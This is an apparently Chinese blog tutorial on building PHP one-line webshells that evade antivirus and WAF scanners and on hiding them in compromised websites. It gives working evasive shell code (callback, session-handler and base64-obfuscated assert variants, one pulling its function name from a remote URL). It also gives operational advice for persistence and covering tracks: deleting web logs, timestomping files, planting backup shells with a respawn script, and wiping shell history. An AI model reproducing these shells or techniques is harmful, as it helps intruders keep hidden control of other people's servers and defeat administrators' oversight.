# php一句话编写技巧

拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：

## 制作免杀webshell

隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。

### 命令执行的方法

这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法

1、直接执行

使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。

```php
@eval('echo 这是输出;');
```

2、动态函数执行

我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行

```php
$a="phpinfo";$a();
```

3、文件包含执行

有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果

```php
b.php
<?php
@eval('echo 这是输出;');

a.php
<?php
include a.php
```

4、回调函数

将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：

```php
<?php
$func = 'system';
$arr = array('whoami');
array_map($func, $arr);
```

5、PHP Curly Syntax

我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果

```php
<?php
$a = 'p';
eval("{$a}hpinfo();");
```

6、php反序列化

这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数`unserialize`

```php
<?php

class test{
    public $a="123";
    public function __wakeup(){
        eval($this->a);
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:10:"phpinfo();";}');
```

7、php://input方法

`php://input`可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，`php://input`会读取到，这时候我们就可以加以利用了

```php
<?php
@eval(file_get_contents('php://input'));
```

8、preg_replace方法

`preg_replace`函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令

```php
<?php
echo preg_replace("/test/e",phpinfo(),"jutst test");
```

9、ob_start

ob_start函数是打开输出控制缓冲，传入的参数会在使用`ob_end_flush`函数的时候去调用它执行输出在缓冲区的东西

```php
<?php
$cmd = 'system';
ob_start($cmd);
echo "whoami";
ob_end_flush();//输出全部内容到浏览器
```

小知识点

```php
ECHO ${"_GE"."T"}['s']; # 也是get

$b = "assert"; $a = 'b'; echo $$a; #等于assert,级别为1，可疑时可以尝试用它

function # 函数,级别为1，可疑时可以尝试用它
```

<!--
```php
// 1 可疑文件
// ?id=1.assert|asd&tid=phpinfo()
function newsSearch($para0){
    $evil=$para0;
    $exec=substr($get,2,strpos($get, '|')-2);
    $get = $_GET['id'];
    call_user_func_array($exec,array($evil));
}
newsSearch($_GET['tid']);
// call_user_func_array(assert,array('phpinfo();'));

function newsSearch($para0,$para1){
    $evil=$para0;
    call_user_func_array($para1,array($evil));
}
$exec=base64_decode($_GET['id']);
newsSearch($_POST['tid'],$exec);

------------------------
// 0 完全过狗
// ?key=phpinfo()&exec=YXNzZXJ0
// php == 5.6
function newsSearch($para0,$para1){
    $evil=$para0;
    $exec=$para1;
    array_udiff($arr=array($evil) , $arr2 = array(1) ,$exec);
}
$exec=base64_decode($_REQUEST['exec']);
newsSearch($_GET['key'],$exec);
// array_udiff($arr = array(phpinfo()), $arr2 = array(1) , "assert");


-----------------------
// 0 完全过狗
// ?id=YXNzZXJ0     密码：op
// php < 7
error_reporting(0);
//$session =  //assert
function test($para){
    session_set_save_handler("open", "close", $para, "write", "destroy", "gc");
    @session_start(); // 打开会话
}
$session=base64_decode($_REQUEST['id']);
// open第一个被调用，类似类的构造函数
function open($save_path, $session_name){}
// close最后一个被调用，类似 类的析构函数
function close(){}
// 执行session_id($_REQUEST['op'])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST['op'])
session_id($_REQUEST['op']);
function write($id, $sess_data){}
function destroy($id){}
function gc(){}
// 第三个参数为read  read(string $sessionId)
test($session);

// -------------------
// 自己写的0 完全过狗简化版
// php < 7  密码id
function downloadFile($url){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    $fileName =  $ext[1];
    $fileName = rand(0,1000).$fileName;
    $file = file_get_contents($url);
    if(!isset($file)){$ary = parse_url($url);$files = basename($ary['path']);$ext = explode('.',$files);$fileName =  $ext[1];$fileName = rand(0,1000).$fileName;}
    return $file;
}
$s  = downloadFile('http://fake-blog.com/asdasfafga.txt');
$id = $_POST['id'];$URL = 'id';@$s($$URL);

// -------------------
// 自己写的0 完全过狗简化版
// php < 7  密码id
function downloadFile($url){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    // assert
    $exec1=substr($ext[0],3,1);
    $exec2=substr($ext[0],5,1);
    $exec3=substr($ext[0],5,1);
    $exec4=substr($ext[0],4,1);
    $exec5=substr($ext[0],7,2);
    $as = $exec1 . $exec2 . $exec3 . $exec4 . $exec5;
    return $as;
}
$s  = downloadFile('http://www.baidu.com/asdaesfrtafga.txt');
$id = $_GET['id'];$URL = 'id';@$s($$URL);

// -------------------
// 自己写的0 完全过狗简化版
// php 7  密码3s79kV

<?php
@error_reporting(0);
if (isset($_GET['3s79kV']))
{
    $key=substr(md5(uniqid(rand())),16);
    $skey=substr(md5(uniqid(rand())),rand(4,16));
    $_SESSION['k']=$key;
    setcookie("uid", $key.$skey);
}else{
    $skey=substr(md5(uniqid(rand())),rand(4,16));
    $a="tents";
    $b='file_'.'get_con'.$a;
    function c($p)
    {
        return eval($p."");
    }
    
    $post = $skey.'|'.$_POST['3s79kV'];
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {c($p);}}
	@new C($params);
}
?>


<?php
function downloadFile($url,$x){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    // assert
    $str=str_replace('d','',$ext[0]);
    $str=str_replace('j','',$str);
    $as[0] = $str;
    $as[1] = $x['x'];
    return $as;
}
$a = $_POST;
$s  = downloadFile('http://www.baidu.com/asdjdsejjrjtdd.txt',$a);
$b = $s[0];
$c = $s[1];
array_map($b,array($c));
``` -->

## 更好的隐藏webshell一些建议

1. 拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除
2. 把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具
3. 目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录
4. 利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中
5. 尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析
6. 上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马
7. 靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件……
8. 如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell
9. webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用
10. webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php
11. 如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到
12. 养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到
13. 当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建
14. 在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了

后话
真正的后门，要靠系统层
对于 PHP 后门来说，如果能做到隐蔽性，不会被D盾等工具自动检测出来。人工查看时，一时半会儿也看不出有问题，其实就够了。

受限于运维的日志审查，通过 PHP 去进行后渗透不太现实，PHP 后门最大的意义在于，留有一个通道。等其它通道关闭或者网站迁移（总要移代码吧）时，能够维持对目标站的控制。

而真正的后渗透操作，还是要考系统层的其它技巧，比如 shift 后门，ssh 后门，注册表木马等等~这些都是后话了~

擦除痕迹
想要让后面隐蔽，除了以上几点，还要清理好文件操作的痕迹。在 Linux 下就是删除 .bash_history 和 .viminfo 的记录，这些记录显示了你前段时间执行了哪些命令，修改了哪些文本。

我这里只是根据个人经验总结了一些比较常用的,当然,肯定还有更多更好更高级的关于webshell的隐藏方法,欢迎大家在下面留言